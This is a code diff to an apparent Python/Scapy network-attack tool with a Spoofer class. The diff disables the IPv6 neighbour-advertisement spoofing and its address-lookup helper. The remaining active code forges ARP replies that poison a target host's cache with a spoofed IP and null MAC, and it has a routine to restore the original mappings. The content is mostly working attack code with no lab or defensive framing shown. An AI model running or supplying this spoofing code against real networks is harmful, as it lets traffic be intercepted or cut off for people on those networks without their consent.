@@ -30,23 +30,34 @@ def getMac(ip, interface=None):
         return ans[0][1].src
     
 
-def getIPv6(IPv4, interface=None):
-    # Gets a device's IPv6 address given its IPv4 address
-    # Basically converts IPv4 to IPv6 (in this context only)
-    mac = ""
-    if interface:
-        mac = getMac(IPv4, interface)
-    else:
-        mac = getMac(IPv4)
-    ns = IPv6(dst="ff02::1:ff" + mac[-6:].replace(":", ""))/ICMPv6ND_NS(tgt="ff02::1:ff" + mac[-6:].replace(":", ""))/ICMPv6NDOptSrcLLAddr(lladdr=mac)
-    if interface:
-        ans = srp1(ns, iface=interface, timeout=3, verbose=0)
-    else:
-        ans = srp1(ns, timeout=3, verbose=0)
-    if ans and ans.haslayer(ICMPv6NDOptDstLLAddr):
-        print("IPv6 address found: ", ans[IPv6].src)
-        return ans[IPv6].src
-    return None
+# def getIPv6(IPv4, interface=None):
+#     # Gets a device's IPv6 address given its IPv4 address
+#     # Basically converts IPv4 to IPv6 (in this context only)
+#     mac = ""
+#     if interface:
+#         mac = getMac(IPv4, interface)
+#     else:
+#         mac = getMac(IPv4)
+#     mac_bytes = [int(x, 16) for x in mac.split(':')]
+#     eui64 = mac_bytes[0:3] + [0xFF, 0xFE] + mac_bytes[3:6]
+#     eui64[0] = eui64[0] ^ 0x02
+#     hex_groups = []
+#     for i in range(0, 8, 2):
+#         part = (eui64[i] << 8) + eui64[i+1]
+#         hex_groups.append(f"{part:04x}")
+#     ipv6 = "fe80::" + ":".join(hex_groups)
+#     ns_target = ipv6
+#     ns = IPv6(dst=ns_target)/ICMPv6ND_NS(tgt=ns_target)/ICMPv6NDOptSrcLLAddr(lladdr=mac)
+#     if interface:
+#         ans = srp1(ns, iface=interface, timeout=3, verbose=0)
+#     else:
+#         ans = srp1(ns, timeout=3, verbose=0)
+#     if ans and ans.haslayer(ICMPv6NDOptDstLLAddr):
+#         print("IPv6 address found: ", ans[IPv6].src)
+#         return ans[IPv6].src
+#     else:
+#         print("IPv6 address not found.")
+#     return None
     
 
 class Spoofer:
@@ -63,34 +74,34 @@ class Spoofer:
     def spoof(self, target_ip, spoofed_ip):
         
         target_mac = ""
-        target_ipv6 = ""
-        spoofed_ipv6 = ""
+        # target_ipv6 = ""
+        # spoofed_ipv6 = ""
         if self.connection_mode == "wifi":
             target_mac = getMac(target_ip, self.interface)
-            target_ipv6 = getIPv6(target_ip, self.interface)
-            spoofed_ipv6 = getIPv6(spoofed_ip, self.interface)
+            # target_ipv6 = getIPv6(target_ip, self.interface)
+            # spoofed_ipv6 = getIPv6(spoofed_ip, self.interface)
         elif self.connection_mode == "eth":
             target_mac = getMac(target_ip)
-            target_ipv6 = getIPv6(target_ip)
-            spoofed_ipv6 = getIPv6(spoofed_ip)
+            # target_ipv6 = getIPv6(target_ip)
+            # spoofed_ipv6 = getIPv6(spoofed_ip)
 
         spoofed_arp_ipv4 = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip, hwsrc="00:00:00:00:00:00", op=2)
-        spoofed_arp_ipv6 = (IPv6(dst=target_ipv6, src=spoofed_ipv6)/ICMPv6ND_NA(tgt=spoofed_ipv6, R=1, S=1, O=1)/ICMPv6NDOptDstLLAddr(lladdr="00:00:00:00:00:00"))
+        # spoofed_arp_ipv6 = (IPv6(dst=target_ipv6, src=spoofed_ipv6)/ICMPv6ND_NA(tgt=spoofed_ipv6, R=1, S=1, O=1)/ICMPv6NDOptDstLLAddr(lladdr="00:00:00:00:00:00"))
         
         send(spoofed_arp_ipv4, verbose=1)
         print("Spoofed ARP sent to IPv4", target_ip, "with MAC", target_mac)
-        send(spoofed_arp_ipv6, verbose=1)
-        print("Spoofed ARP sent to IPv6", target_ip, "with MAC", target_mac)
+        # send(spoofed_arp_ipv6, verbose=1)
+        # print("Spoofed ARP sent to IPv6", target_ip, "with MAC", target_mac)
 
 
     def unspoof(self, target_ip, real_ip):
         target_mac = getMac(target_ip)
         real_mac = getMac(real_ip)
-        target_ipv6 = getIPv6(target_ip)
-        real_ipv6 = getIPv6(real_ip)
+        # target_ipv6 = getIPv6(target_ip)
+        # real_ipv6 = getIPv6(real_ip)
         unspoofing_arp_ipv4 = ARP(pdst=target_ip, hwdst=target_mac, psrc=real_ip, hwsrc=real_mac, op=2)
-        unspoofing_arp_ipv6 = (IPv6(dst=target_ipv6, src=real_ipv6)/ICMPv6ND_NA(tgt=real_ipv6, R=1, S=1, O=1)/ICMPv6NDOptDstLLAddr(lladdr="00:00:00:00:00:00"))
+        # unspoofing_arp_ipv6 = (IPv6(dst=target_ipv6, src=real_ipv6)/ICMPv6ND_NA(tgt=real_ipv6, R=1, S=1, O=1)/ICMPv6NDOptDstLLAddr(lladdr="00:00:00:00:00:00"))
         send(unspoofing_arp_ipv4, verbose=1, count=7)
-        send(unspoofing_arp_ipv6, verbose=1, count=7)
+        # send(unspoofing_arp_ipv6, verbose=1, count=7)
         print("Original ARPs restrored.")
 
